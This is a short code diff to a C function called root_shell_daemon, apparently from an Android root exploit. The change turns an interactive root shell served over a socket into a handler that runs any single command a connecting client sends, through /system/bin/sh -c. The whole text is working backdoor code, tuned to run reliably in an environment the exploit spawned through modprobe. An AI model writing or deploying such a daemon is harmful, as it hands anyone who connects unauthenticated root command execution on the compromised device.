@@ -51,8 +51,18 @@ void root_shell_daemon(void) {
       dup2(c, 0); dup2(c, 1); dup2(c, 2);
       if (c > 2) close(c);
       close(s);
-      execl("/system/bin/sh", "sh", "-i", (char *)NULL);
-      _exit(127);
+      /* Robust one-command-per-connection: read a line, run it via sh -c.
+       * (mksh -i does not reliably read a non-tty socket in the modprobe-
+       * spawned environment, so avoid interactive mode.) */
+      char cmd[1024];
+      ssize_t n = read(0, cmd, sizeof(cmd) - 1);
+      if (n > 0) {
+        cmd[n] = 0;
+        char *nl = strchr(cmd, '\n');
+        if (nl) *nl = 0;
+        if (cmd[0]) execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
+      }
+      _exit(0);
     }
     close(c);
     while (waitpid(-1, NULL, WNOHANG) > 0) { }
